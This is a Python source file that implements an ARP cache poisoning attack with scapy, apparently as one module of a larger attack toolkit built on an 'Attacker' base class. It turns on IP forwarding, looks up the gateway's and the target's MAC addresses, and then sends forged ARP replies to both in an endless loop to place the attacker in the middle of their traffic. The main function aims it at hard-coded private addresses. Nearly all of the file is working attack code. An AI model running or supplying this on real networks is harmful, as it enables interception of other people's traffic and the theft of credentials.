from attacker import Attacker

from scapy.all import ARP, Ether, IP, ICMP, send, sr1, srp1
import platform
import time

class ArpPoisner(Attacker):
	"""
	Parameters
	----------
	target : str
		The target's hostname or IP address

	Methods
	-------
	print_gateway_ipv4()
		Prints the gateway IP address

	print_gateway_mac()
		Prints the gateway MAC address

	start()
		Poisons the router's and target ARP cache by continuously sending gratitious ARP
		messages
	"""
	def __init__(self, target:str):
		"""
		Parameters
        ----------
		target : str
			The target's hostname or IP address
		"""
		super().__init__(target, attack="ARP_POISON")
		self.gateway_ipv4 = ArpPoisner.get_default_gateway_ipv4()
		self.gateway_mac = ArpPoisner.get_mac(self.gateway_ipv4)

	@property
	def target_mac(self):
		return ArpPoisner.get_mac(self.target_ipv4)

	@staticmethod
	def setup_config():
		"""Enables IP forwarding"""
		print("[*] Enabling IP forwarding")
		# Check to see if script is running on linux
		if (platform.system() == "Linux"):
			# Enable IP forwarding
			ipf = open('/proc/sys/net/ipv4/ip_forward', 'r+')
			ipf_read = ipf.read()
			if (ipf_read != '1\n'):
				ipf.write('1\n')
			ipf.close()

		# TODO
		if (platform.system() == "Windows"):
			print("[*] Windows detected.\nPlease ensure IP forwarding is enabled")

	@staticmethod
	def get_mac(ip:str):
		"""Gets the MAC address for the given IP addressed"""
		arp = Ether()/ARP(pdst=ip)
		resp = srp1(arp, verbose=False)
		return resp[Ether].src

	@staticmethod
	def get_default_gateway_ipv4():
		"""Gets the attacker's default gateway's IP address"""
		ans = sr1(IP(dst="www.google.com", ttl = 0)/ICMP()/"XXXXXXXXXXX", verbose=False)
		return ans.src

	def print_gateway_ipv4(self):
		"""Prints the gateway IP address"""
		print("[*] The gateway IP address is: {}".format(self.gateway_ipv4))

	def print_gateway_mac(self):
		"""Prints the gateway MAC address"""
		print("[*] The gateway MAC address is: {}".format(self.gateway_mac))

	def start(self):
		"""
		Poisons the router's and target ARP cache by continuously sending gratitious ARP
		messages
		"""
		print("[*] Poisoning router's and target's ARP cache")
		# Poison gateway's cache
		while True:
			send(ARP(
					op=2,
					psrc=self.target_ipv4,
					pdst=self.gateway_ipv4,
					hwdst=self.gateway_mac
				),
				verbose=False,
			)

			# Poison target's cache
			send(ARP(
					op=2,
					psrc=self.gateway_ipv4,
					pdst=self.target_ipv4,
					hwdst=self.target_mac
				),
				verbose=False,
			)

			# Sleep to prevent flooding
			time.sleep(2)

	def __repr__(self):
	# 	return "ArpPoisoner('{}')".format(self.target_ipv4)
	 	return (f'{self.__class__.__name__}('
	 			f'{self.target_ipv4})')

def main():
	a = ArpPoisner("172.20.10.1")
	print(a)
	print(a.target_mac)
	a.target_ipv4 = "172.20.10.2"
	print(a.target_mac)
	a.print_target_ip()
	a.print_gateway_mac()
	a.print_gateway_ipv4()
	a.start()

if __name__ == "__main__":
	main()